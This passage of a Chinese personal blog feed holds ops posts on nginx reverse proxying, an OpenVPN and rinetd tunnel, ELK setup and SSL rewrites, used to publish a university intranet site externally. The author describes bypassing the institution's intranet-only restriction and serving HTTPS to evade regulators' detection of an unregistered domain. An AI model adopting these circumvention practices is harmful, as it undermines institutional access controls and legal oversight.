class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                           </span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;                                           </span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.***.64.***;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;                                                                     </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl ;                             </span><br><span class="line">    <span class="attribute">server_name</span>  <span class="regexp">bkjw.*</span>**<span class="regexp">*.diglp.xyz</span>;                                            </span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;                                     </span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/mine.diglp.xyz.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/mine.diglp.xyz.key;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                        </span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                               </span><br><span class="line">    <span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                           </span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;                                           </span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.***.13.***;</span><br><span class="line">    &#125;                                                                         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于这里的说明：</p><ul><li>由于域名没有备案，所以随随便便弄个自签证书，顶上去，先用着了。所以会显示不安全</li><li>配置文件从 模板 copy-paste 上来的，所以有些冗长</li><li>这里还撞上了名字服务的问题</li></ul><hr><p>配置完成后使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/nignx -s reload</span><br></pre></td></tr></table></figure><p>对其进行热重启就好了。理论上问题不大。</p><h2 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h2><p>这个架构十分的简单，也没有什么问题可言吧。好像是的，直接公网访问。即可</p><h2 id="可用性保证"><a href="#可用性保证" class="headerlink" title="可用性保证"></a>可用性保证</h2><p>由于条件问题，内网客户端并不能保证稳定以及可用性，为了可用性的保证，这里使用 云拨测，对目标 URL 进行定时请求，当有服务不可用时，及时的进行告警。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9jb25zb2xlLmNsb3VkLnRlbmNlbnQuY29tL2NhdC9hdmFpbFRhc2tMaXN0" title="https://console.cloud.tencent.com/cat/availTaskList">腾讯云-云拨测<i class="fa fa-external-link"></i></span> 现在是免费使用 Recommend</p></blockquote><h2 id="过程问题笔记"><a href="#过程问题笔记" class="headerlink" title="过程问题笔记"></a>过程问题笔记</h2><p>这部分，没什么太大营养。。。</p><h3 id="rewrite"><a href="#rewrite" class="headerlink" title="rewrite"></a>rewrite</h3><p>其实，在这整个搭建的过程中，遇到了一个很大的问题。什么呢？就是通过名字对页面进行访问和区分。比如 <code>adb.com/1</code> 和 <code>abc.com/2</code> <strong>分别转发到不同的</strong>。乍一看是很好实现的，直接 rewrite 就好了比如这样：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /phpMyAdmin &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/services/web;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> /phpMyAdmin/disabled.html <span class="literal">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的确可以实现隐式的重定向，但是这里的核心问题，<strong>不是同源</strong>。所以这个方法直接 pass 掉了。</p><hr><h3 id="直接proxy-pass的问题"><a href="#直接proxy-pass的问题" class="headerlink" title="直接proxy_pass的问题"></a>直接proxy_pass的问题</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /bkjw/ &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.*.13.*;</span><br><span class="line"><span class="comment">#proxy_pass http://bkjw.guet.edu.cn;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的配置看似是没有问题，但是在测试的时候，会发现非常非常多的 <code>404</code>。具体什么情况呢？因为页面的请求是相对与我们的路由路径 <code>/bkjw/</code> 来加载静态文件的。所以请求的路径是 <code>abc.com/bkjw/</code> 直接导致了静态文件的 <strong>404</strong>。</p><p>那么就想嘛，我把静态文件单独代就行了？所以有这样的：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf|js|css|html)$</span></span><br><span class="line"><span class="regexp"></span>&#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://172.*.13.*;</span><br><span class="line">    <span class="attribute">expires</span>      <span class="number">30d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然这样也是不行的，有悖了初衷，还是占用了 <code>/</code>。</p><h3 id="Set-Cookie-和-referer-的脑洞"><a href="#Set-Cookie-和-referer-的脑洞" class="headerlink" title="Set-Cookie 和 referer 的脑洞"></a>Set-Cookie 和 referer 的脑洞</h3><p>那么归根结底，我们要确认的是这个静态文件的请求是从哪里来的。于是就想到了 referer。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$http_referer</span> <span class="regexp">~* '.*/bkjw/'</span> )&#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.#.13.#;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一试，还可以！打开了首页里面所有的东西都加载出来了。不过问题又出现了，在打开第二个页面的时候，<code>referer</code> 已经发生了变化，同样导致大量 404。</p><hr><p>这样，我就给用户一个标识，在请求资源的时候我就可以判断啦。这里就出现了 <code>set-cookie</code> 的方法。希望通过cookie的方式给用户一个标识符，说明其源站从哪里来。配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /bkjw/ &#123;</span><br><span class="line">    <span class="comment">#add_header Set-Cookie 'bussid=bkjw' ;</span></span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.16.13.22/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">if ($cookie_&#123;bussid&#125; ~* 'bkjw' )&#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.#.13.#;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果发现，并没有什么用。F12 看了看，发现了奥秘，<strong>请求静态资源的时候是不进行Cookie传递的</strong>，一想也是，这样才安全嘛。</p><blockquote><p>这里回顾一个经典的 phishing 的手段，在邮件中插入一个外部图片，透过请求图片的请求头，获得已读回执，和基本的系统状态 </p></blockquote><hr><p>至此没有办法，只能使用 <code>server_name</code> 来对其进行区分，最终的配置如上上的示例所示。显得不是那么有美感了。</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><blockquote><p>人工智能的发展一旦上路了将会是飞速的，不要想着如何对付和人一样聪明的电脑，要么它永远不如你，要么它就把你远远的甩在身后。和你齐头并进只不过是一个瞬间而已。</p></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/21/OP_%E5%8F%A6%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F(reverse%20proxy)/#disqus_thread</comments>
    </item>
    
    <item>
      <title>记一次内网穿透配置(tunnel)</title>
      <link>https://www.diglp.xyz/2019/02/20/OP_%E6%84%9A%E8%A0%A2%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88(tunnel)/</link>
      <guid>https://www.diglp.xyz/2019/02/20/OP_%E6%84%9A%E8%A0%A2%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88(tunnel)/</guid>
      <pubDate>Tue, 19 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;一个挺重要的网站,奈何只能内网访问, 想着把他外网映射出来…遂为之&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;这篇文章应该是 2018/1/14时候就已经完成了，总是缺一点内容于是就没有post 出去。现在是时候了，因为完成同样的事情，现在有了第二个更好的解决方案，所以这这里 post
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>一个挺重要的网站,奈何只能内网访问, 想着把他外网映射出来…遂为之</p><hr><p>这篇文章应该是 2018/1/14时候就已经完成了，总是缺一点内容于是就没有post 出去。现在是时候了，因为完成同样的事情，现在有了第二个更好的解决方案，所以这这里 post 上去，做个对比。</p><p>这篇的方法十分的简单粗暴，使用了昂贵的资源，做了简单的事情，也是个反面教材。不过从底层的原理还是OK的。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="VPN-simple概念"><a href="#VPN-simple概念" class="headerlink" title="VPN simple概念"></a>VPN simple概念</h3><p>VPN 是 Virtual Private Network 的缩写, 翻译过来是虚拟专用网络.引用百科的话来讲:</p><blockquote><p>虚拟专用网络的功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。</p></blockquote><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1518414600419&amp;di=f908309c6976739a03741121bb706d0b&amp;imgtype=0&amp;src=http%3A%2F%2Fs9.rr.itc.cn%2Fr%2FwapChange%2F20171_23_14%2Fa7zdid2847716173619.jpg" alt="VPN"></p><p>通俗的讲, 使用VPN 技术,可以将 在公有网络的 两台主机, 进行一个私有的隧道链接, 效果,就和我们自家用的路由器一样. 在一个 VPN 下的子网主机是可以互相访问的(规则允许的话)</p><p>VPN 再协议栈层级很低的地方，一般在 2或者3 层，也就是数据链路层或者网络层，这里的 端口转发涉及到端端在第四层。</p><h3 id="端口转发-Port-Tunnel-simple概念"><a href="#端口转发-Port-Tunnel-simple概念" class="headerlink" title="端口转发(Port-Tunnel) simple概念"></a>端口转发(Port-Tunnel) simple概念</h3><p>一样援引百科的定义</p><blockquote><p>端口转发（Port forwarding），有时被叫做隧道(tunnel)，端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，其使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p></blockquote><p>很好理解的东西, 端口转发技术, 显然是用于端到端的通信. 端到端,在TCP/IP的协议栈中, 是包含了TCP和UDP 这两种数据传输方式, 所以可见所有的应用层的数据, 都可以使用端口转发(这也是 ss 和 http代理的区别).</p><p>在这里我们使用端口转发, 对Http请求进行直接转发.<br><img src="http://img4.imgtn.bdimg.com/it/u=745504115,462270053&amp;fm=27&amp;gp=0.jpg" alt="port"></p><h2 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h2><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>先使用外网VPN服务器, 让内网主机接入其子网, 而后通过两次的端口转发(port-tunnel), 达到内网服务器<br>现在分析具体情况, 我们的内网外部不可访问, 内网主机可以互相访问, 我们的内网主机可以访问外网. 所以我们我要实现的是</p><ul><li>先使得我们的主机可以外网访问, 所以首先连接外网, 这里就选择了VPN.内网主机,和公网主机组合成一个子网</li><li>内外网主机可以互相访问之后, 使用端口转发, 暴露公网主机的端口, 转发到我们的VPN子网的某个端口.实现外网访问我们内网的转发主机</li><li>实现了转发主机的外网访问之后, 我们再在转发主机上, 进行二次转发. 让流量,从虚拟子网, 转发到内网可以访问的目标主机的80 . </li><li>至此, 方案完成</li></ul><p><img src="https://i.loli.net/2018/02/12/5a810b0b4888d.png" alt="ARCH"></p><h3 id="具体实施"><a href="#具体实施" class="headerlink" title="具体实施"></a>具体实施</h3><p>这里使用 <code>OpenVPN</code> 在这里建立了VPN连接，为了方便管理和配置，（因为只是自己用），所以这里推荐使用 <code>openvpn-as</code> 是一个管理前端。免费版允许两台主机同时连接，自己使用实际上也是已经够了的。配置的过程这里年久失修，脑子里也没有了，难度系数一颗星。</p><p>在搭建完成之后，开始使用客户端进行连接，记得开放主机的安全组端口配置。连接之后，使用 <code>ifconfig</code> 应该会有个 Vlan的 interface 。这里就是我们的 VPN 子网。</p><hr><p>有了子网之后，先互 ping 确保联通。之后使用这里的主角 <code>rinetd</code> 。是一个十分轻量级的端口转发工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 2333 172.16.64.*** 80</span><br></pre></td></tr></table></figure><p>启动脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pkill rinetd</span><br><span class="line">sudo rinetd -c /etc/rinetd.conf</span><br></pre></td></tr></table></figure><p>这样就实现了，在 <strong>2333</strong> 端口到目的主机的 80端口的内容转发，最终转发的就是我们的 HTTP 的请求。</p><hr><p>同样的，在我们的云服务器上一样需要这样的配置，把用户们输入的请求，转发到我们的 VPN 的子网之中，到内网转发主机的模板端口，来再进行下一次转发。在公网主机上我们一样使用上面类似的配置。只不过，是从 公网 转发到 VPN 子网，反向操作。</p><hr><p>综上，基本的链路已经实现和打通。还会有一点我问题。这样直接访问的话，得到的结果是 <strong>无法连接</strong>。 为什么？</p><p>因为，在默认的路由出了问题。</p><p>路由是什么？怎么用？ 看篇文章：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JlbnlpZm9yZXZlci9hcnRpY2xlL2RldGFpbHMvNzc4NTEwMTI=" title="https://blog.csdn.net/renyiforever/article/details/77851012">win7操作系统双网卡同时上内外网<i class="fa fa-external-link"></i></span></p><p>所以文oveli对路由进行指定：让这个 IP 走我们的 199.1 的网关。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route add -host 172.16.64.236 gw 192.168.199.1</span><br></pre></td></tr></table></figure><p>至此，整个配置完成。（辣鸡方案）</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>这篇文章，是一年前的烂尾了，现在才post出来，是为了后面的更好的方案做对比。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/20/OP_%E6%84%9A%E8%A0%A2%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88(tunnel)/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ELK 日志可视化平台 搭建</title>
      <link>https://www.diglp.xyz/2019/02/14/OP_ELK%20%E6%97%A5%E5%BF%97%E5%8F%AF%E8%A7%86%E5%8C%96%20%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</link>
      <guid>https://www.diglp.xyz/2019/02/14/OP_ELK%20%E6%97%A5%E5%BF%97%E5%8F%AF%E8%A7%86%E5%8C%96%20%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</guid>
      <pubDate>Wed, 13 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;架构选型&quot;&gt;&lt;a href=&quot;#架构选型&quot; class=&quot;headerlink&quot; title=&quot;架构选型&quot;&gt;&lt;/a&gt;架构选型&lt;/h2&gt;&lt;p&gt;这里使用ELK
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="架构选型"><a href="#架构选型" class="headerlink" title="架构选型"></a>架构选型</h2><p>这里使用ELK 平台主要是实现了单主机的日至手机以及可视化，吞吐量比较小，所以直接进行单点部署。由以下几个组件组成：</p><ul><li>FileBeat</li><li>Elasticsearch</li><li>Kibana</li></ul><p>Filebeat 这里实现日志文件的手机以及格式化，并且通过管道直接存入ES</p><p>ES 作为主体，实现对索引条目进行保存</p><p>Kibana 实现了ELK系统的整体监控，通过 API与ES交互，实现数据可视化，以及设置。</p><ul><li>logstash</li></ul><p>logstash 作为一个对数据进行流处理的module，这里由于不需要对日志进行进一步处理，所以并没有使用此组件。<strong>关键是内存真的不够了，跑不起来了是真的Q</strong></p><h2 id="安装及部署"><a href="#安装及部署" class="headerlink" title="安装及部署"></a>安装及部署</h2><p>安装以及部署的过程实际上并不是十分复杂，在<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWxhc3RpYy5jby8=" title="https://www.elastic.co/">ELK项目官网<i class="fa fa-external-link"></i></span>上实际上已经给出了相关的 <code>rpm包</code>，所以直接使用 rpm 进行安装即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 root root  12M Jan 29 19:31 filebeat-6.6.0-x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 177M Jan 29 19:34 kibana-6.6.0-x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 163M Jan 29 19:35 logstash-6.6.0.rpm</span><br><span class="line">rpm -ivh xxx.rpm</span><br></pre></td></tr></table></figure><hr><p>这里涉及到的一个 point 是<code>systemV init</code> 还是 <code>systemd</code> 下面给出一篇相关文章，(IBM Developer 还真是个好地方。)</p><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9saW51eC8xNDA3X2xpdW1pbmdfaW5pdDMvaW5kZXguaHRtbA==" title="https://www.ibm.com/developerworks/cn/linux/1407_liuming_init3/index.html">浅析 Linux 初始化 init 系统，第 3 部分<i class="fa fa-external-link"></i></span></p></blockquote><p>这里提到的是Linux里最重要的启动进程，作为<strong>第一个用户态进程</strong> 其PID为1 <code>ps 1</code> 可以看到进程的运行。他负责在内核启动之后，完成余下的引导过程，比如加载加载服务，启动Shell/图形化界面等等。在 CentOS 7 之后，使用 Systemd 风格取代了原来的 init的风格。（使得启动速度有的提升）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps 1</span><br><span class="line">  PID TTY      STAT   TIME COMMAND</span><br><span class="line">    1 ?        Ss     2:50 /usr/lib/systemd/systemd --switched-root --system --deserialize 21</span><br></pre></td></tr></table></figure><p>可以看到，这里的 ps1 已经是 systemd 了。</p><p>所以这里又涉及到了，Ubuntu 和 CentOS 的一大差别，自己也是用了才发现，之前Ubuntu的服务启动与管理使用 <code>service</code> 命令，并且在 <code>/etc/inittab</code> 里面可以对初始化进行一系列的配置。在Cent里面写着一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">总之在目前的环境中，使用 `systemctl` 命令对服务进行控制。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">➜  ~ systemctl status elasticsearch.service</span><br><span class="line">● elasticsearch.service - Elasticsearch</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/elasticsearch.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2019-02-05 02:39:39 CST; 1 weeks 1 days ago</span><br><span class="line">     Docs: http://www.elastic.co</span><br><span class="line"> Main PID: 27965 (java)</span><br><span class="line">   CGroup: /system.slice/elasticsearch.service</span><br><span class="line">           ├─27965 /bin/java -Xms256m -Xmx256m -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Des.networkaddress.cache.ttl=6...</span><br><span class="line">           └─28026 /usr/share/elasticsearch/modules/x-pack-ml/platform/linux-x86_64/bin/controller</span><br></pre></td></tr></table></figure><hr><p>之后修改各自的配置文件，使得其端口对应，一般就可以跑起来了。</p><p>为了安全起见，这里使用 Nginx 做了一个 Web 的认证，对路由进行一个转发。</p><h2 id="环境调整"><a href="#环境调整" class="headerlink" title="环境调整"></a>环境调整</h2><h3 id="ES的JVM-的堆大小调整-（heap）"><a href="#ES的JVM-的堆大小调整-（heap）" class="headerlink" title="ES的JVM 的堆大小调整 （heap）"></a>ES的JVM 的堆大小调整 （heap）</h3><p>启ES的时候，直接报错 <code>unable to alloca</code> ，一想应该是内存太小了导致的问题。查看配置文件 <code>/etc/elasticsearch/jvm.options</code> 并且进行参数调整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-Xms256m# 这里缺省为 1g</span><br><span class="line">-Xmx256m</span><br></pre></td></tr></table></figure><p>由于本机的RAM也只有 <strong>1G</strong> 还得跑其他的奇怪的东西，所以这里只能非常的乞丐设置。分出一点宝贵内存。</p><h3 id="虚拟内存-Swap-的设置"><a href="#虚拟内存-Swap-的设置" class="headerlink" title="虚拟内存 Swap 的设置"></a>虚拟内存 Swap 的设置</h3><p>由于VM的机能，所以1G的内存显然是不够用的。只能改变参数。使得<code>JVM</code>分配的内存只有 256M。且，启用虚拟内存，即swap。</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RpYW5sZXNvZnR3YXJlL2FydGljbGUvZGV0YWlscy84NzQxODcz" title="https://blog.csdn.net/tianlesoftware/article/details/8741873">Linux SWAP 交换分区配置说明 - CSDN<i class="fa fa-external-link"></i></span></p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=/swap-file bs=1M count=1024# 新建白文件 1G</span><br><span class="line">mkswap /swap-file# 格式化</span><br><span class="line">swapon /swap-file# 启用swap</span><br></pre></td></tr></table></figure><p>为了使swap自动挂载使用 <code>/etc/fstab</code> 里面进行配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UUID=653bbeb5-4abb-4295-b110-5847e073140dswapswapdefaults00</span><br><span class="line">/swap-file swap    swap    defaults00</span><br></pre></td></tr></table></figure><hr><p>顺便调整了 <code>swappiness</code> 使得机器更加积极的使用 虚拟内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sysctl vm/swappiness=60</span><br></pre></td></tr></table></figure><h3 id="设置副本数-0"><a href="#设置副本数-0" class="headerlink" title="设置副本数 0"></a>设置副本数 0</h3><p>由于只是单点，且性能受限，这里发现的问题es的节点状态一直是 <code>yellow</code>。归根发现就是性能问题，所以这里进行配置，<strong>设置其分片副本为 0</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -H "Content-Type: application/json" -XPUT 'http://localhost:9202/_settings' -d '</span><br><span class="line">&#123;</span><br><span class="line">    "index" : &#123;</span><br><span class="line">        "number_of_replicas" : 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;'</span><br></pre></td></tr></table></figure><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p><strong>Happy Valentine’s Day</strong></p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/02/14/OP_ELK%20%E6%97%A5%E5%BF%97%E5%8F%AF%E8%A7%86%E5%8C%96%20%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 折腾笔记（SSL配置以及路由重写）</title>
      <link>https://www.diglp.xyz/2019/02/08/OP_Nginx%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88SSL%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99%EF%BC%89/</link>
      <guid>https://www.diglp.xyz/2019/02/08/OP_Nginx%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88SSL%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99%EF%BC%89/</guid>
      <pubDate>Thu, 07 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;需求分析，由于 搭好了日志平台，本想着把Blog迁移到主机上，最后想想，算了&lt;/p&gt;
&lt;p&gt;这里的博客的域名，本来是通过
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>需求分析，由于 搭好了日志平台，本想着把Blog迁移到主机上，最后想想，算了</p><p>这里的博客的域名，本来是通过 在解析配置里面使用了一个 <code>CNAME</code>到 <a href="quartz010.github.io">quartz010.github.io</a> 实现一次访问，这里对架构进行一次调整。原 <code>blog</code>的二级先解析到服务器，留下日志之后，进行一次隐式跳转，实现一次访问。不过，这样会受限于服务器的带宽。但是也算是接入了日志平台。所以这里需要使用 Nginx  实现重定向。</p><hr><p>其二，域名不备案，web一起来，就被工信部给 ban 了。可是备案太麻烦了，真的是懒。所以这里跑 HTTPS ，做一个短期的检测绕过。因为 HTTPS 其报文内容是加密的，所以流量只要不是很大，应该也不至于单独去做侧信道的分析。所以这里顺便给部署全站的  HTTPS 访问暂时的撑着。</p><h2 id="显式重定向-和-隐式重定向"><a href="#显式重定向-和-隐式重定向" class="headerlink" title="显式重定向 和 隐式重定向"></a>显式重定向 和 隐式重定向</h2><p>这里的一点调整在于 Github page 的命名</p><p>当repo 命名为 <code>quartz010.github.io</code> 可以直接通过 其进行访问，如果其他命名的话，需要进行 quartz010.github.io/xxx 进行访问，所以修改之后导致了其找不到静态文件。导致样式消失以及一大堆404 的问题。</p><p>这里给出 基本配置：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>       [::]:<span class="number">80</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="attribute">server_name</span> blog1.diglp.xyz;</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line">   <span class="attribute">include</span> /etc/nginx/default.d/<span class="regexp">*.conf</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="attribute">location</span> / &#123;</span><br><span class="line">   <span class="comment">#rewrite  ^/(.*)$  /$1 break;</span></span><br><span class="line">   <span class="attribute">proxy_pass</span> https://quartz010.github.io;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment"># rewrite "^/(.*)$" https://quartz010.github.io/$1 last;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重点在 Location 的这一段：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="comment">#1# rewrite  